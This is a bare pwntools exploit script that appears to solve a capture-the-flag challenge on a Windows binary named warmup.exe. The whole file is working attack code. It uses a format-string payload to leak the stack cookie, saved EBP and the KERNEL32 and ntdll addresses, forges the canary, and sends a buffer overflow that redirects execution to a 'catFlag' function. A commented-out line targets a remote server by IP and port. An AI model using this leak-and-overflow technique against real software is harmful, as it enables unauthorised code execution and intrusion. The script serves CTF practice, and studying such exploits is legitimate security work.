from pwn import *

bin_path = "./warmup.exe"
args = []
args.append("lmf")
args.append("bp chall2!main")
args.append("g")
args.append("p")
args.append("p")
args.append("p")
args.append("dd ebp-4")
#s=remote("54.224.176.60",1414)
s=process(bin_path)
#s = windbg.debug([bin_path],args)

#windbg.attach(s)
leaker="%p"*10 + "aaa" + "0x%p "*3 + "%p"*38 + "bbb" + "0x%p "*4
s.send(leaker)
s.recvuntil("aaa")
cookie = int(s.recv(10),16)
log.info("COOKIE = " + hex(cookie))
s.recv(1)
oldebp = int(s.recv(10),16)
ebp = oldebp-76
log.info("ebp = " + hex(ebp))
s.recv(1)
catFlag = int(s.recv(10),16)-167
log.info("catFlag = " + hex(catFlag))
s.recvuntil("bbb")
kernel32 = int(s.recv(10),16)
log.info("KERNEL32 = " + hex(kernel32))
s.recv(11)
ntdll = int(s.recv(10),16)
log.info("ntdll = " + hex(ntdll))
canary = cookie^ebp
log.info("CANARY = " + hex(canary))

maincookie = canary^oldebp
log.info("Main cookie = " + hex(maincookie))
exploit = "a"*0x40 + p32(maincookie) + "a"*4 + p32(catFlag)
s.recvuntil("Did you make something out of it ??? :")
s.send(exploit)

s.interactive()
